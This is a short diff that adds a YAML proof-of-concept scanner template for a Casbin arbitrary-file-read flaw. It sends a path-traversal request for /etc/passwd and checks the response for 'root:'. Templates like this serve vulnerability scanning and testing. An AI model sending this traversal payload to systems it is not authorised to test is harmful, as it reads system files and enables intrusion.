@@ -1,0 +1,9 @@
+name: poc-yaml-Casbin-Directory
+description: "任意文件读取"
+method: GET
+path:
+  - /static/../../../../../../../../../../../etc/passwd
+expression:
+  status: 200
+  body_all:
+    - "root:"
